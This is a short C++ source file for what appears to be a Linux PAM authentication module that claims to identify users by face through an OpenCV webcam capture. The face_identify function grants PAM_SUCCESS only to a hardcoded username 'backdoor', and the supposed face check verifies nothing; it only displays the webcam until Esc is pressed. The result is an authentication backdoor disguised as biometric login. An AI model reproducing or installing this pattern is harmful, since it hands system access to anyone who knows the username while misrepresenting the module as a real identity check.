#include "identify.h"

int capture_face()
{
    cv::VideoCapture camera(0); // in linux check $ ls /dev/video0
    if (!camera.isOpened())
    {
        std::cerr << "ERROR: Could not open camera" << std::endl;
        return 1;
    }

    // create a window to display the images from the webcam
    cv::namedWindow("Webcam", cv::WINDOW_AUTOSIZE);

    // Matrix to hold image
    cv::Mat frame;

    // display the frame until you press a key
    while (1)
    {
        // capture the next frame from the webcam
        camera >> frame;
        // show the image on the window
        cv::imshow("Webcam", frame);
        // wait (10ms) for esc key to be pressed to stop
        if (cv::waitKey(10) == 27)
            break;
    }
    return 0;
}

int face_identify(
    pam_handle_t *pamh,
    int flags,
    int argc,
    const char **argv)
{
    int retval;
    const char *pUsername;

    retval = pam_get_user(pamh, &pUsername, "Username: ");

    if (retval != PAM_SUCCESS)
        return retval;

    if (strcmp(pUsername, "backdoor") != 0)
        return PAM_AUTH_ERR;

    printf("Welcome %s\n", pUsername);
    int status = capture_face();
    if (status != 0)
        return PAM_AUTH_ERR;

    return PAM_SUCCESS;
}